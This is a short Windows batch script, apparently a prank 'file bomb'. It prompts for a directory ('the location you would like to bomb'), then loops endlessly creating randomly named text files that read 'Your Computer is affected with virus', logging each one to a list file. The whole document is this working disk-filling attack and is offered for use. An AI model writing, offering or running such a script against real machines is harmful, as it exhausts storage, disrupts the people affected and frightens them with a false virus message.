@echo on
set /p "location=Enter the location you would like to bomb: " 
cd %location%
echo %location%
:1
set /A temp = %random%
echo Your Computer is affected with virus > %temp%.txt
echo %temp%.txt >> temp_db.txt
goto 1
